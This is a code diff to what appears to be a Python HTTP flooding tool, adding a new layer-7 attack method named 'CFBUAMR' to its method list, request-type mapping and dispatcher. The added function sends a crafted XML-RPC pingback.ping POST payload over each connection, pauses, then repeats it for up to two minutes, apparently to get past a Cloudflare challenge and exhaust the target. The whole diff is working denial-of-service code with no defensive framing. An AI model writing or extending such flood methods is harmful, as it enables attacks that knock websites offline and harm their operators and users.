@@ -80,7 +80,7 @@ def exit(*message):
 class Methods:
     LAYER7_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
-        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
+        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM","CFBUAMR",
         "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
     }
 
@@ -729,7 +729,7 @@ class HttpFlood(Thread):
         return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH", "EVEN",
                                             "DYN", "SLOW", "PPS", "APACHE",
                                             "BOT", "RHEX", "STOMP"} \
-            else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS"} \
+            else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS","CFBUAMR"} \
             else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
             else "REQUESTS"
 
@@ -902,6 +902,27 @@ class HttpFlood(Thread):
         with suppress(Exception), self.open_connection() as s:
             Tools.send(s, payload)
             sleep(5.01)
+            ts = time()
+            for _ in range(self._rpc):
+                Tools.send(s, payload)
+                if time() > ts + 120: break
+        Tools.safe_close(s)
+    def CFBUAMR(self):
+        payload: bytes = self.generate_payload(
+            ("Content-Length: 345\r\n"
+             "X-Requested-With: XMLHttpRequest\r\n"
+             "Content-Type: application/xml\r\n\r\n"
+             "<?xml version='1.0' encoding='iso-8859-1'?>"
+             "<methodCall><methodName>pingback.ping</methodName>"
+             "<params><param><value><string>%s</string></value>"
+             "</param><param><value><string>%s</string>"
+             "</value></param></params></methodCall>") %
+            (ProxyTools.Random.rand_str(64),
+             ProxyTools.Random.rand_str(64)))[:-2]
+        s = None
+        with suppress(Exception), self.open_connection() as s:
+            Tools.send(s, payload)
+            sleep(6)
             ts = time()
             for _ in range(self._rpc):
                 Tools.send(s, payload)
@@ -1135,6 +1156,8 @@ class HttpFlood(Thread):
             self.SENT_FLOOD = self.CFB
         if name == "CFBUAM":
             self.SENT_FLOOD = self.CFBUAM
+        if name == "CFBUAMR":
+            self.SENT_FLOOD = self.CFBUAMR
         if name == "XMLRPC":
             self.SENT_FLOOD = self.XMLRPC
         if name == "BOT":
